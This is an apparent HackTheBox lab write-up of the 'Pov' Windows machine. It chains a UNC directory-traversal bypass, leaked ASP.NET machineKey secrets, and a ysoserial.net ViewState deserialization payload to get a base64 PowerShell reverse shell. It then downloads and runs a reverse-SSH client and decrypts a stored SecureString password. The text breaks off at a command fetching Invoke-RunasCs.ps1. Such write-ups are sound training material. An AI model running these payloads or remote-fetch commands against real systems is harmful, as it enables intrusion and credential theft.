---
render_with_liquid: false
title: HackTheBox Writeup  Pov
date: 2024-02-03 09:38:36 +1400
tags: [hackthebox, nmap, windows, feroxbuster, gobuster, subdomain, aspx, directory-traversal, directory-traversal-bypass, unc, aspx-viewstate, ysoserial-dotnet, deserialization, reverse-ssh, discover-secrets, powershell-securestring, runascs, privilege-token]
---



Pov is a medium Windows machine that starts with a webpage featuring a business site. Enumerating the initial webpage, an attacker is able to find the subdomain `dev.pov.htb`. Navigating to the newly discovered subdomain, a `download` option is vulnerable to remote file read, giving an attacker the means to get valuable information from the `web.config` file. The subdomain uses the `ViewState` mechanism, which, in combination with the secrets leaked from the `web.config` file, is vulnerable to insecure deserialization, leading to remote code execution as the user `sfitz`. Looking at the remote filesystem, an attacker can discover and manipulate a file that reveals the credentials for the user `alaading`. Once the attacker has code execution as the user `alaading` the `SeDebugPrivilege` is abused to gain code execution in the context of a privileged application, ultimately resulting in code execution as `nt authority\system`.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ pt init '10.129.230.183 pov pov.htb dev.pov.htb'
+---------+--------+----------------+-------------+
| PROFILE | STATUS |       IP       |   DOMAIN    |
+---------+--------+----------------+-------------+
| pov     | on     | 10.129.230.183 | pov         |
| pov     | on     | 10.129.230.183 | pov.htb     |
| pov     | on     | 10.129.230.183 | dev.pov.htb |
+---------+--------+----------------+-------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sat Feb  3 09:38:36 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80, pov
Nmap scan report for pov (10.129.230.183)
Host is up, received user-set (0.090s latency).
Scanned at 2024-02-03 09:38:36 CST for 13s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Feb  3 09:38:49 2024 -- 1 IP address (1 host up) scanned in 12.89 seconds
```

## 80 - HTTP : Cybersecurity service


### Info

```ruby
http://pov.htb [200] [pov.htb] [Microsoft-IIS/10.0] [Bootstrap,IIS:10.0,Microsoft ASP.NET,Windows Server] [dbffb35b51be9149dd2f19eff18807bd46b383d7]
```

- Found `pov.htb`, add to hosts

![](/assets/obsidian/8a964e3c71b654ef23ba557f28904b94.png)

### Directory

```bash
feroxbuster -t 100 -w /usr/share/dirb/wordlists/common.txt -u http://pov -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ cat ferox_80.txt | awk '$1!=404 && $1!=403'
200      GET        4l       10w      382c http://pov/img/favicon.png
200      GET        3l       15w     1063c http://pov/img/client-4.png
200      GET        5l       26w     1732c http://pov/img/client-5.png
200      GET        6l       20w     1480c http://pov/img/client-2.png
200      GET      162l      286w     2399c http://pov/css/custom.css
200      GET       19l      133w    11607c http://pov/img/smart-protect-2.jpg
200      GET        8l       34w     2034c http://pov/img/client-3.png
200      GET       23l      207w    11858c http://pov/img/smart-protect-3.jpg
200      GET       22l      132w    13356c http://pov/img/smart-protect-1.jpg
200      GET       14l       43w     2390c http://pov/img/client-1.png
200      GET       13l       55w     5918c http://pov/img/logo.png
200      GET        3l       20w     1898c http://pov/img/client-6.png
200      GET        2l      284w    14244c http://pov/js/aos.js
200      GET        4l       66w    31000c http://pov/font-awesome-4.7.0/css/font-awesome.min.css
200      GET        2l      220w    25983c http://pov/css/aos.css
200      GET      339l     1666w   139445c http://pov/img/feature-1.png
200      GET      325l     1886w   151416c http://pov/img/feature-2.png
200      GET        6l     1643w   150996c http://pov/css/bootstrap.min.css
200      GET      234l      834w    12330c http://pov/
301      GET        2l       10w      138c http://pov/css => http://pov/css/
301      GET        2l       10w      157c http://pov/font-awesome-4.7.0/css => http://pov/font-awesome-4.7.0/css/
301      GET        2l       10w      138c http://pov/img => http://pov/img/
200      GET      234l      834w    12330c http://pov/index.html
301      GET        2l       10w      159c http://pov/font-awesome-4.7.0/fonts => http://pov/font-awesome-4.7.0/fonts/
301      GET        2l       10w      137c http://pov/js => http://pov/js/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k -t 100 -u http://pov.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://pov.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.pov.htb Status: 302 [Size: 152] [--> http://dev.pov.htb/portfolio/]
Found: xn--nckxa3g7cq2b5304djmxc-biz.pov.htb Status: 400 [Size: 334]
Found: xn--cckcdp5nyc8g2837ahhi954c-jp.pov.htb Status: 400 [Size: 334]
[...]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```


# User Flag
---

## Enumeration


### dev.pov.htb - Developer about page

```ruby
http://dev.pov.htb/portfolio/ [200] [dev.pov.htb] [Microsoft-IIS/10.0] [IIS:10.0,Microsoft ASP.NET:4.0.30319,Windows Server] [cdee55ae7f60ac4591a4e744339e3d1718030e76]
```

![](/assets/obsidian/fdb96c517d7b2719f3b48823548cbada.png)

The only dynamic function in the site was `Download CV`

![](/assets/obsidian/eba35f7a448e63bc0d1779207aaf7aa9.png)


## Shell as sfitz


### Directory traversal with UNC bypass

The `Download CV` request have a parameter : `file`

![](/assets/obsidian/fa82e7fc9dad58a6a777013d6c0802c8.png)

By testing a few directory traversal payloads, it will redirect us to `/default.aspx?aspxerrorpath=/portfolio/default.aspx`, that might because it was filtered

![](/assets/obsidian/c22f3469da1bd4a3298acab707ac4a91.png)

Since this is a windows machine, try UNC path to bypass it

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md#unc-bypass

Successfully bypassed

```c
\\localhost\c$\windows\win.ini
```

![](/assets/obsidian/073678183c678aadda7b0e62c3b4e252.png)

### Exploit VIEWSTATE knowing the secrets


#### Validate

Since this is an ASP.NET application, the first thing to try after having arbitrary file read is get `web.config`

Since `dev` was the vhost, tried `C:\inetpub\wwwroot\dev\web.config` and it worked

```
\\localhost\c$\inetpub\wwwroot\dev\web.config
```

```c
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

After **knowing the validation key and its algorithm**, I'm able to exploit unsafe deserialization

> https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret

> https://github.com/pwntester/ysoserial.net

Check examples

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/WinTools/ysoserial-1.36]
└─$ ./ysoserial.exe -p ViewState
ysoserial: Incorrect plugin mode/arguments combination
Try 'ysoserial -p ViewState --help' for more information.
Exmaples:

.NET Framework >= 4.5:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"

.NET Framework <= 4.0 (legacy):
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug

.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"

.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```

Target have `dotnet framework 4.5`, use example 1

```bash
PS H:\VM-Share\Kali\WinTools\ysoserial-1.36> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping 10.10.14.3" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
m%2FutmANHgRJp%2Bd7eqZllZzosrc7eJ55pzASpskfqiz9aG%2FbAx0jRPFRrJ1IDwNrREOR3NEN6pjZMWnvMf7A3RN4i0cuss54ij1CUQPrKrvSeoyxI%2FNJSrXcOUva7xPo4jlZlE9vcbE%2BPOtd%2BWbr1GsFv7Jr5WEmLOm3MluoeUTwLXht3AIc0u9FKhFbjLGr%2BmelmeMCjNzL5IQ8%2BLY7hzzOv9213Ub13FOdL730vP3yuYBS28NhfW6BzAqHrbORqYvqfC%2BhR%2Fb6Z86WxELJEeQSyhj3KrIiN7GwD%2B%2FvAwWid%2FNJzcOhgQ%2Bntx1p3kBLzLbvdRjQre9q%2FtHjJadolT7sO9V6I36YK%2F9IW9jr%2Bva5fMX4nwAPpRRgMWLjGjOcosxO1Qnu13cciIIDrqBxuvvmtoY2BeqQ3lcq3zN64Zk%2FRUYoAIcuTsfJmPjHvcMKRiTylt1PWD%2B5B%2FtdKRazcOj9UmRVjOuPX1yLaH%2FL4Zw4mMVXUebaCA454iAoELwqtjgt2L4v%2FdI3%2B6kl276XsTU7eU6HYXw90mVF8WpCJ8cC%2Fl13T3uvrh2mfWoQRqEQJ0ghEpGbufz7fKRizKaO3NlSh%2BouIfT14xDXqHQRppf46KiaGvELhvxQbbJP0F0DGpJiv2DlPnysz%2FD%2Fu3313MCOMQckqvG%2Fr7lEERFTe2kpnAtKYi3yDw41jvKc0BsD2gGqlMd7YQTulUM65h7TXjYv8JLb9pGIHljH38FX3ktVk9Jx8YqIYwKwtVTtGR%2BFQW01oX9bR%2BpKtqyYEDbFk3b0ZknCkPUs%2B%2B%2BjUtXJmaWHLQwwiuOb%2FgbVGxCGFvrzobdXEGYq6cIOwO6fHKXZ0UjRDqox7XXmRZaxCIIb0mGa9Z%2BoXogCjrWMBDAKkpa73dLbjJk4bAN84j3GQeT6s21xbHjRZrLOPfTUS5NL%2FIKEKLzCQdO%2BMYQVi1D%2FOt%2F%2FIWF%2BtxTNIXXJPlNlY7GZe0KwwfDlnOzzUsJGoGukvabez%2FvSd1Q0bnLaYizXRrcTLSrm6Z57O4Am9tiPwPFrMruIlSh0CdCzpxArLkvqoqyYZLHEgxdntU03tCeD%2BQfmmYkiz%2F7yVwsA3cYFG2OZvYlnyFGS1EsYRwEFLqXKWCcImJJn4VFRwg2I8UtLoSeSk81Yf8SyL8T7tw90UZAkhK3jPOS1IAVhA3LKj0ZRW2mudw8dRy4r8EEanylsWyeRMXAT4uv4CZTUKkVRlrtfBuhgSmnobFYorPYdbG3ofWEw9FKZh1aXeB32Sy9DZofxC9F2GjzMAUM4n0hizz5Zyoz6lL%2FY%3D
```

- `--path` : URL path to aspx file
- `apppath` : Root path of the asp.net app

Confirmed command execution was successful

![](/assets/obsidian/fc401e4b1678e5bba2d4de0ae5ccefbb.png)

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/WinTools/ysoserial-1.36]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:30:24.175839 IP pov > fsociety: ICMP echo request, id 1, seq 1, length 40
22:30:24.175868 IP fsociety > pov: ICMP echo reply, id 1, seq 1, length 40
```

#### Get a shell

Using the payload `PowerShell #3 (Base64)` from  https://www.revshells.com/

```bash
PS H:\VM-Share\Kali\WinTools\ysoserial-1.36> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwAMQAxADEAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
cxZLQNcLIcemiC%2F%2Fw4bl5sV6X9kouyNgP8lZjcvTNaLsSXdUD9nfev9slqyZjZIU5X9K0iRucE7xJLiw88YWzIfblm%2F7I%2Fj%2BhYGNwqN0vwOhcxxJP4VTrfkozepKRePgS71fG%2FzRBWjdokqam7uZsQ1EBfYVB8XCJxCDY1WifXZuBEdq4DvWX%2BYTdTUkyy%2Bbfk7waa4ux13c2ruhbnkP25ZyWSt1WmEE4tjMgjPgTSMrsNWhe54QrXBWL8es3XO%2FGuUJhjZ9%2FfAy3Cclj8ZIvRYZJ72hc1VuQdZydkkYKIXjUdT%2F9BhWhZUBiothYAIJAwGQg0mqCvTHgEvcSGbeWWdCiUgVfbazJqtb4HljWHpvNq%2BDDnm%2FXHHXiw5kHoxsbIcT9WT6CRZV%2F486%2FmvxBOZ0jnCPRhn%2F1L6284h6VFbzydGQpgkDH%2F3EBh7Z1NWRgjtLyY39PWYvuUPpymB2J8qEP7LPMb81nXiQmBnTzT2ZpZ9OCvU3gbeoTBHkJ7jnV4TNfjVc%2FPFyGOYoATFIptxfsdkN2lT69s4O2Ddc%2FjGIb%2FhhYND884l8QaqJ%2FkmbS%2BhlvHqXtR2Yisr6tPR11EJ%2FPDLO7%2BLRkJ2ytYNxAmxGMR43VtSnCtaAUJSbdfPyblkoKf4ODdb01wMNbNikuirRLqNRuspvWfeZpwSzfnGUFe%2FmAyH1cwq1GrHCvP9TqSwtSBhfhUsFPGKZnXST3AMmydDoXu3bilKheKqVZETYdlXy8GYm5oYMVKch6PSpquONeCo4P6cwLjHEtOVe5O7YKZLFwUVsZWi3PAKObDHlrQWoZikgVqkYzK%2Fzwqd7MO8chYC8m8yq66ZPzf0M88IPLK4mz385d5uTDwmEsRVWb2xTq0Lcfyz3xh5nrZ4%2FsFdl3zzkyLZiDJrZjxxUwfxe1DRdboDODBb1RiSNzVPS2MJ5HwR2WuC9fpTaYwvE4q9Yef9VSYnJHsmm8RS6LMqIU%2FDGHYYES8PychPYyA9JgEFSkN3qO6%2B89S2fzpHkaE6UCL6QZuUpmxATMxwHECsOttdiVMNbw9NerxDxq6Gk6dMvoCPjCIfu05IyPdHHOWOyQRe%2BZZ44X8AiUJ0kBGgMY%2FYm8YBFXsYfgFMLQMdslmhZhNfiJ1xPlFauZAb6Wk%2Fy42nvEy7AQLXJbcc1nrcpp17TdiEdOt4eR7%2F9GjHtctdr%2FR0TONBrBbBHVq626Zl6vYwcmXuRHUAuv1AkTtldZ7wO0JsEvrB8e5lLF7U27l0wMFytR8OoBxjy3pzj6e1%2BKOckOHnggIQRvf5jQ0sOM2lWQoZBKXxqwlENPzExnJ98cp4KlIM1ESUWMRte7bE92DZY26OIRmr0dtZICBngSSx3OazHfL%2BFhJH4eClOBzRTCEVJ%2BUrvagyvGwi%2B5%2FM2yEZCloMw3HwJyFraY18bHE08nDhFwga70YLFy8wrSIbjArdins6yod34mGelVvp0O3Kr2MOHV35gUuIMWckmYOxclvomQD6MXTZTyutxNmui77wmyJNDFZZWAi2TcvZ2HZmqN7Zv3o5GKlTTG1YvHdRr6XyH7mOLqXw9zy0Kh%2BrI68433qt5fejGZPQjwzFIE%2FZDDthcvq0ORn41CfKnYTDNKUvFm5h%2F9dEODXg5s4f7CpHmrRxjUg2eOxkiwiQvS%2BAbgBaBZwE2EdONJ8s2kmiLDChdYYM%2B87bpwKQOHSwIfih14ZoXru2vaYK3Q3So4SP8oAZ5%2FhEmFyjGQ4cSiDtBe1ePZXCxuEzzNvIzN4uXHJ7VwxxtpmfbeEvcKB1%2FwSrrlKqynfZzwY5LrwBuhnLRyDGJBR6PiYTZN0fsRNTw70%2FxspICgG4CxdE%2F4%2FYd3EiAhwT%2BvuZbBtQe9nVR2ID9jKeeaWvoxrNl4AZpenFB2CSn1AOXemQTC2t5xQ4%2BSxImAi4c5sq4BP%2B8dUX%2BJpepz4vytYlNR8IIMc0B%2FJT8ydg8RX40s%2BJ2NYmD4e1h4dnxTQD1BwyZSUg8xR3WPSyuF9SLOXGn%2BVZkLrE4d0LxNgwwHcGiYLAz2%2FxKhSaLbTcVnKvR2RAmy08oi2HCsaL%2F8Z9ryp7q7Smqf9yBu05FsgWejtG%2FL%2Fn9xlY%2Bef7cxFJKw96RS%2BNrRAinT6ougxGiZgmoYcnKEiB%2FchJ2c63Se5PAvs1AwhOr0fSC6Kj17sGe2U9Wm%2BjnV0I3JyH6NLBZoo3V5DZJP5ymBzV5wqTPASes9znlMnDvW1jDWsCtc0hMOWKfjncTQqogsJiikawLHdEXJUZ8j0diLrSozg316Ksg6XK1B38Nrj%2F8iMZGwm61spGS0x9X8G4E36MpMWsH1dpsnsIM%2BcA%2BFgUS1f4KBAozm2csGf8tRZJ%2BzYLV5EotcC1yYez9YOWNLmfxSUH8m7lA%2FuJuh%2BB97O%2F7OaujC4iPVi5ap35BToCiXVPcK00SwgX3EbHzxqazhSbKYVtRrIzKiAvXuhLrFY%2Bx5jI7mOEIGUFPWpS0d1R2Zpx6pN8zViO85hWmgBq%2FqJSxLRuq9nquUyoJtx6LXGZxml062D76tmi3VE5FKsYrQ19V57ACaYQjxItE%2FMGt%2Fk9EjJBOq8Zr8hmrir6eOF6wVh%2B0EES4tNZOMVKApFcEKdWIJZQih4oTQ9qWBvBVeN%2BEVitjnLoyMSbgnu8B9egYTaQ70T14KrdTNgPkbTeH%2BMiMlbxyDLkj3wz%2FMusnZ2iuwY0F9ZtacLgndItqua8tgZBmY8Gff25DQsXogFUeAnSgvnYaJuheddMhOqSfwTANWx91ANOmvkGgkT0%2BpP8WQUzEYXv%2FdTBkyxn7P8IXM%2F4BxaAJBaTNlIDQ3N3P1Mj5BZ3uuAJr2ji%2FgtBybZ2FbdCMb9jTlWl5jCSSJyK2YfLvu%2FElNU4YERy2w75gwYveUm0KM5PX%2FxZ2rWwrAfF0WNXtHpHORtn23r1hIiaY6kejaM5jKLRAs%2FNr9nQEFp%2Fqum3PvQL4Brl0IlcHCH0x3fPu0TTCTyTgbqGWVY05NGvAFhG%2BJ2YlQJ%2B3uzoR%2BssMzhD%2FgcQJyf9cFPXtsRXdbN%2FRjgYpk%2F5ST1Z9ge5ktVHquw%3D%3D
```

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/WinTools/ysoserial-1.36]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.230.183] 49682
whoami
pov\sfitz
PS C:\windows\system32\inetsrv>
```


### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ./server 0.0.0.0:443
2024/01/18 23:19:14 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/01/18 23:19:14 Version:  v2.4.1
2024/01/18 23:19:14 Listening on 0.0.0.0:443
2024/01/18 23:19:14 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2024/01/18 23:19:14 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2024/01/18 23:19:14 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2024/01/18 23:19:14 Was unable to read webhooks configuration file
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.3:443 make
```

Download and start the client

```bash
PS C:\windows\system32\inetsrv> powershell iwr 10.10.14.3/win/client.exe -o \programdata\client.exe; \programdata\client.exe
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 54c5d5d9e07f478282b6dc883cad37b5286d5a53 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| pov.sfitz.pov                            |                          |
| 10.129.230.183:49673                     |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ ssh -J 127.0.0.1:443 pov.sfitz.pov
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
```


## From sfitz to alaading


### Enumeration

```bash
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name SID
========= =============================================
pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
PS C:\windows\system32> (ls -Force C:\Users\*\Documents\* | sort LastWriteTime) 2>$null
[...]
    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl       10/26/2023   5:02 PM                My Videos
d--hsl       10/26/2023   5:02 PM                My Pictures
d--hsl       10/26/2023   5:02 PM                My Music
-a-hs-       10/26/2023   5:02 PM            402 desktop.ini
-a----       12/25/2023   2:26 PM           1838 connection.xml
```

There's a `password Secure String` for `alaading`

```bash
PS C:\windows\system32\inetsrv> cat C:\Users\sfitz\Documents\connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
PS C:\windows\system32\inetsrv>
```

### Decode SecureString from connection.xml

```bash
PS C:\windows\system32\inetsrv> $cred = Import-CliXml -Path C:\Users\sfitz\Documents\connection.xml; $cred.GetNetworkCredential() | fl *

UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString
Domain         :
```

> **Another way to convert secure string to plaintext**
> ```bash
> $pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
> $user = "HTB\Tom"
> $cred = New-Object System.management.Automation.PSCredential($user, $pass)
> $cred.GetNetworkCredential() | fl
> ```
{: .prompt-tip }

### RunasCS

There are mainly 3 ways to impersonate other users:
- RunasCS
- runas.exe (Requires interactive shell)
- Powershell `PSCredential`

In this case I need to use **RunasCs** to preserve privilege tokens for later on exploitation

```bash
PS C:\windows\system32\inetsrv> iex (new-object net.webclient).downloadstring("http://10.10.14.3/pwsh/Invoke-RunasCs.ps1")
